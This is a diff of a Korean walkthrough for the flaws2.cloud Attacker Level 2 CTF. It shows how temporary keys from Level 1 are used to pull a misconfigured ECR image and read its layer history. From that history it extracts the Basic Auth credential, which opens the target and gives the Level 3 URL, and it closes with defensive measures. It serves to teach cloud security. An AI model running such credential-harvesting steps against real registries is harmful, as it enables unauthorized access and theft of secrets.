@@ -1,145 +1,142 @@
-# Attacker Level 2 — 공개 ECR 레포지토리에서 자격증명 추출
+# Attacker Level 2 — 공개 ECR 이미지에서 자격증명 추출
 
-> **URL**: http://level2.flaws2.cloud/
-> **핵심 기술**: ECR 공개 레포지토리 · Docker 이미지 레이어 분석
+> **URL**: http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/
+> **타겟 서버**: http://container.target.flaws2.cloud/ (HTTP Basic Auth 로 잠김)
+> **ECR 레포지토리**: `653711331788.dkr.ecr.us-east-1.amazonaws.com/level2`
+> **핵심 기술**: ECR 레포 정책 오설정 · Docker 이미지 레이어 분석
 > **난이도**: ⭐⭐
-> **본인 AWS 계정 필요**: ❌ (Docker 만 있으면 됨)
+> **본인 AWS 계정 필요**: ❌ (Attacker L1 에서 얻은 임시 키로 충분)
 
 ## 🎯 목표
 
-이 사이트는 컨테이너 이미지로 배포돼 있다. 운영자는 이미지를 저장하는 ECR(Elastic Container Registry) 레포지토리를 **공개** 로 설정했다. 이미지를 pull 해서 **레이어 안에 남은 자격증명·소스 파일** 을 찾고 다음 레벨로 진행한다.
+문제 페이지가 직접 말해준다: "**타겟은 ECS 컨테이너이며 ECR 레포지토리 이름은 `level2`**". 레포 정책이 공개돼 있어 L1 역할 키로도 이미지 정보를 읽을 수 있다. **이미지 레이어 히스토리**에 남은 `htpasswd` 명령에서 Basic Auth 자격증명을 꺼내 잠긴 타겟을 통과한다.
 
 ## 🧭 공식 힌트
 
 <details>
 <summary><b>Hint 1</b></summary>
 
-> 이 사이트는 ECS Fargate + ECR 로 돌고 있습니다. **이미지가 공개** 되어 있다면 어떤 정보가 노출될까요?
+> 타겟: http://container.target.flaws2.cloud/. 401 을 돌려줍니다. ECR 레포 이름은 `level2`.
 
 </details>
 
 <details>
 <summary><b>Hint 2</b></summary>
 
-> `aws ecr` 계열 명령으로 공개 레포를 검색하거나, `docker pull` 로 직접 가져올 수도 있습니다.
+> `aws ecr describe-images --registry-id 653711331788 --repository-name level2` 가 Attacker L1 키로도 통합니다. 레포 정책이 공개이기 때문.
 
 </details>
 
 <details>
 <summary><b>Hint 3</b></summary>
 
-> 이미지 내 `Dockerfile`, `entrypoint`, 환경변수에 **AWS 자격증명** 이 남아 있을지 모릅니다. `docker history` 와 `docker run --rm -it <image> sh` 로 안을 뒤지세요.
+> `docker pull` 이 설치돼 있다면 가장 간단합니다. 없다면 **manifest → config blob → `.history`** 로 Dockerfile 한 줄 한 줄을 복원할 수 있습니다.
 
 </details>
 
 ## 📚 사전 지식
 
-- **ECR 레포지토리** 는 사설이 기본이지만 `public.ecr.aws` 로 공개 가능. 레포 정책에 `Principal: *` 을 열어 두면 미인증 pull 이 허용된다.
-- 이미지는 **레이어** 로 구성된다. 중간에 `RUN` 으로 지운 파일도 그 이전 레이어엔 남아 있다 → `docker history`, `dive` 로 볼 수 있음.
-- 실수로 넣은 `AWS_ACCESS_KEY_ID` 환경변수는 **ENV** 레이어에 영구 박제.
+- ECR 은 **레포지토리 정책**으로 `Principal: *` 을 허용할 수 있다 (공개 pull).
+- Docker 이미지 manifest 는 **layers** 와 **config blob** 으로 구성. config 의 `.history[].created_by` 에 Dockerfile 각 줄이 그대로 남아 있다.
+- 이미지 레이어 안에서 지워진 파일도 **이전 레이어**에는 살아 있는 경우가 많다.
 
 ## 🔍 정찰
 
-### 1. ECS 계정 ID 확인
-Attacker L1 에서 얻은 자격증명으로:
+### 1. 타겟 상태 확인
 ```bash
-aws sts get-caller-identity
-# Account: 653711331788
+curl -sI http://container.target.flaws2.cloud/ | head -3
+# HTTP/1.1 401 Unauthorized
+# WWW-Authenticate: Basic realm="Restricted Content"
 ```
 
-### 2. 그 계정의 ECR 리포지토리 나열
+### 2. Attacker L1 임시 키 로드 (아직 세션 유효하면)
 ```bash
-aws ecr describe-repositories --region us-east-1
+source /tmp/l1creds.sh     # Attacker L1 에서 저장한 파일
+aws sts get-caller-identity --region us-east-1
 ```
-출력 예:
-```
-{ "repositoryName": "level2", "repositoryUri": "653711331788.dkr.ecr.us-east-1.amazonaws.com/level2" }
-```
+> 세션이 만료됐으면 Attacker L1 을 다시 실행하여 새 키를 받는다.
 
-### 3. 리포지토리 정책 확인
+### 3. 레포 이미지 확인 (describe-images 는 L1 역할 정책에 포함돼 있음)
 ```bash
-aws ecr get-repository-policy --repository-name level2 --region us-east-1
+aws ecr describe-images \
+  --registry-id 653711331788 \
+  --repository-name level2 \
+  --region us-east-1
 ```
 출력:
 ```json
-{
-  "Version": "2008-10-17",
-  "Statement": [{
-    "Effect": "Allow",
-    "Principal": "*",
-    "Action": ["ecr:BatchGetImage", "ecr:GetDownloadUrlForLayer"]
-  }]
-}
+{"imageDetails":[{"registryId":"653711331788","repositoryName":"level2","imageDigest":"sha256:513e...","imageTags":["latest"],...}]}
 ```
-모든 Principal 에게 Pull 허용 — **공개 레포지토리** 이다.
 
 ## 🧨 취약점 원리
 
-- Docker 이미지에 **자격증명·내부 URL·DB 덤프** 를 빌드 시 집어넣는 실수는 매우 흔함.
-- 이미지가 공개되면 그 안의 모든 **파일시스템 스냅샷** 이 공개된 셈.
-- 특히 `COPY` 로 넣은 소스·`.aws/credentials`·`kubeconfig` 등이 문제.
+- ECR 레포에 `Principal: *` 정책이 있거나, 이번 경우처럼 **Lambda/ECS 태스크 역할에게 pull 을 허용**하는 정책이 공격자 손에 들어가면 이미지 전체가 노출.
+- 개발자는 이미지 빌드 중 `htpasswd -b ... secret_password` 같은 **명령을 레이어로 박제**해 버리는 실수를 자주 한다.
+- `docker history --no-trunc` 한 줄로 전부 드러남.
 
 ## 🛠 풀이
 
-### 1. Docker 로그인(공개지만 AWS ECR 인증 필요)
+두 경로 중 하나를 선택.
+
+### 경로 A — Docker 가 있을 때 (가장 쉬움)
+
 ```bash
+# ECR 로그인 (임시 키 로드 상태에서)
 aws ecr get-login-password --region us-east-1 \
   | docker login --username AWS --password-stdin 653711331788.dkr.ecr.us-east-1.amazonaws.com
-```
 
-### 2. 이미지 pull
-```bash
+# pull + history
 docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
+docker history --no-trunc 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest \
+  | grep htpasswd
+# /bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password
 ```
 
-### 3. 레이어 히스토리 확인
-```bash
-docker history --no-trunc 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
-```
-중간에 `ENV AWS_SECRET_ACCESS_KEY=...` 같은 레이어가 보이면 바로 그것.
+### 경로 B — Docker 없이 manifest → config blob 직접 다운로드
 
-### 4. 이미지 내부 탐색
 ```bash
-docker run --rm -it --entrypoint sh \
-  653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
-```
-```sh
-ls /app
-cat /app/proxy.js
-cat /root/.aws/credentials 2>/dev/null
-env | grep AWS
-```
-발견되는 예:
-```
-AKIAIUFNQ2WCOPROD  /  <secret>
+# 1. manifest 에서 config digest 추출
+CFG=$(aws ecr batch-get-image --registry-id 653711331788 --repository-name level2 \
+        --image-ids imageTag=latest --region us-east-1 \
+      | jq -r '.images[0].imageManifest' | jq -r '.config.digest')
+echo "$CFG"    # sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621
+
+# 2. ECR HTTP API 로 blob 받기 (리다이렉트 따라감)
+TOKEN=$(aws ecr get-authorization-token --region us-east-1 | jq -r '.authorizationData[0].authorizationToken')
+curl -sL -H "Authorization: Basic $TOKEN" \
+  "https://653711331788.dkr.ecr.us-east-1.amazonaws.com/v2/level2/blobs/$CFG" -o /tmp/cfg.json
+
+# 3. Dockerfile 히스토리에서 htpasswd 줄 추출
+jq -r '.history[].created_by' /tmp/cfg.json | grep htpasswd
+# /bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password
 ```
 
-### 5. 얻은 키로 S3 리스팅 → 다음 레벨
+### 4. 획득한 자격증명으로 Basic Auth 통과
 ```bash
-aws configure --profile level2
-aws s3 ls --profile level2
-# level3-xxxx.flaws2.cloud 가 보임
+curl -s -u 'flaws2:secret_password' http://container.target.flaws2.cloud/ \
+  | grep -Eo 'level[0-9]-[^"]+flaws2\.cloud' | head -1
+# level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
 ```
-또는 페이지/레포 내 README 에 다음 레벨 URL 이 힌트로 박혀 있기도 하다.
 
 ## 🚪 정답 & 다음 레벨
 
 <details>
 <summary>정답 펼치기</summary>
 
-- 다음 레벨: **Attacker Level 3** (레포에서 찾은 URL)
-- 교훈: **공개 레포에 자격증명·비공개 소스 절대 금지**. 멀티스테이지 빌드로 "빌드 산출물만" 최종 이미지에 남긴다.
+- Basic Auth: `flaws2:secret_password`
+- 다음 레벨: **http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/**
+- 교훈: 이미지 레이어는 **불변 히스토리**. `RUN` 명령에 비밀을 넣으면 지워도 남는다.
 
 </details>
 
 ## 🌍 실제 세계 사례
 
-- 2018 년 **Vine** 의 Docker 이미지 공개로 전체 소스 유출.
-- GitHub Container Registry·Docker Hub 의 공개 이미지 스캐너가 매일 수천 건의 평문 키를 신고.
+- 2019 년 Vine 의 Docker 이미지 공개로 전체 소스 유출.
+- Docker Hub·ECR·GHCR 의 공개 이미지 스캐너들은 매일 수천 건의 평문 AWS 키·SSH 개인키를 신고한다.
 
 ## 🛡 방어 대책
 
-### ① 레포지토리 정책에서 `Principal: *` 금지
+### ① 레포 정책 점검 — `Principal: *` 금지
 ```bash
 aws ecr set-repository-policy --repository-name level2 \
   --policy-text '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::222233334444:root"},"Action":"ecr:BatchGetImage"}]}'
@@ -175,10 +172,10 @@ RUN --mount=type=secret,id=aws_creds \
 
 ## ✅ 체크리스트
 
-- [ ] `aws ecr get-repository-policy` 로 공개 여부 판정
-- [ ] `docker pull` → `history --no-trunc` 재현
-- [ ] 이미지 내 `env` 출력에서 자격증명 발견
-- [ ] 본인 레포를 공개로 두고 BuildKit secret 로 시크릿 제거 연습
+- [ ] `aws ecr describe-images` 가 L1 키로도 성공
+- [ ] `docker history --no-trunc` 또는 config blob 의 `.history` 에서 htpasswd 줄 발견
+- [ ] `flaws2:secret_password` 로 타겟 통과
+- [ ] 본인 ECR 레포를 공개로 두고 `trivy image` 로 비밀 탐지 실습
 
 ## ⏭ 다음
 
